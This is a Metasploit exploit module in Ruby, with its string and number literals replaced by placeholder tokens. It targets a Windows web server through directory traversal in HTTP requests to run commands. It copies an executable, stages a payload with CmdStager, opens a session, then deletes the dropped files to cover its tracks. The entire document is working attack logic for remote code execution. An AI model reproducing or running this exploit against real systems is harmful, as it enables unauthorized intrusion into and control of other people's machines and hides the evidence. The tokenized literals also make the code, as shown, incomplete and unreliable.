require <str> require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: Tcp include Msf :: Exploit :: CmdStager def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > [ [ <str> , { } ] ] , <str> = > <str> , <str> = > <int> , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptString . new ( <str> , [ false , <str> , nil ] ) , OptString . new ( <str> , [ false , <str> , nil ] ) ] , self . class ) framework . events . add_exploit_subscriber ( self ) end def dotdotslash possibilities = [ <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> ] possibilities [ rand ( possibilities . length ) ] end def mini_http_request ( opts , timeout = <int> ) connect req = <str> req << opts [ <str> ] req << <str> req << opts [ <str> ] req << <str> req << <str> req << <str> datastore [ <str> ] <str> req << <str> sock . put ( req ) begin headers = sock . get_once ( - <int> , timeout ) || <str> body = sock . get_once ( - <int> , timeout ) || <str> rescue :: EOFError end disconnect [ headers , body ] end def detect_windows_dir ( ) win_dirs = [ <str> , <str> ] win_dirs . each { | dir | res = execute_command ( <str> , { <str> = > dir } ) if ( res . kind_of? ( Array ) ) body = res [ <int> ] if ( body and body =~ <str> ) return dir end end } return nil end def check @win_dir = detect_windows_dir ( ) if @win_dir return Exploit :: CheckCode :: Vulnerable end Exploit :: CheckCode :: Safe end def execute_command ( cmd , opts = { } ) return [ nil , nil ] if cmd =~ <str> print_status ( <str> cmd <str> opts . inspect <str> ) uri = <str> exe = opts [ <str> ] if ( not exe ) uri << dotdotslash uri << dotdotslash uri << ( opts [ <str> ] || @win_dir ) uri << <str> else uri << exe end uri << <str> uri << Rex :: Text . uri_encode ( cmd ) vprint_status ( <str> uri <str> ) mini_http_request ( { <str> = > uri , <str> = > <str> , } , <int> ) end def exploit @win_dir = datastore [ <str> ] if not @win_dir @win_dir = detect_windows_dir ( ) if not @win_dir fail_with ( Failure :: NoTarget , <str> ) end end print_status ( <str> @win_dir <str> ) exe_fname = rand_text_alphanumeric ( <int> + rand ( <int> ) ) + <str> print_status ( <str> exe_fname <str> ) res = execute_command ( <str> @win_dir <str> exe_fname <str> ) if ( datastore [ <str> ] ) res = execute_command ( datastore [ <str> ] , { <str> = > exe_fname } ) if ( res [ <int> ] ) print_status ( <str> + res [ <int> ] ) else print_error ( <str> ) end res = execute_command ( <str> exe_fname <str> ) return end execute_cmdstager ( { <str> = > <str> , <str> = > <int> , <str> = > exe_fname } ) @exe_cmd_copy = exe_fname @exe_payload = stager_instance . payload_exe print_status ( <str> ) mini_http_request ( { <str> = > <str> + stager_instance . payload_exe , <str> = > <str> } , <int> ) handler end def on_new_session ( client ) if client . type != <str> print_error ( <str> ) print_error ( <str> ) return end return if not @exe_cmd_copy client . core . use ( <str> ) if not client . ext . aliases . include? ( <str> ) print_status ( <str> @exe_cmd_copy <str> ) client . fs . file . rm ( @exe_cmd_copy ) client . console . run_single ( <str> ) return if not @exe_payload delete_me_too = <str> + @exe_payload print_status ( <str> delete_me_too <str> ) cmd = <str> @win_dir <str> + delete_me_too client . sys . process . execute ( cmd , nil , { <str> = > true } ) print_warning ( <str> delete_me_too <str> ) begin client . fs . file . rm ( delete_me_too ) rescue :: Exception = > e print_error ( <str> e . inspect <str> ) end end def cleanup framework . events . remove_exploit_subscriber ( self ) end end 
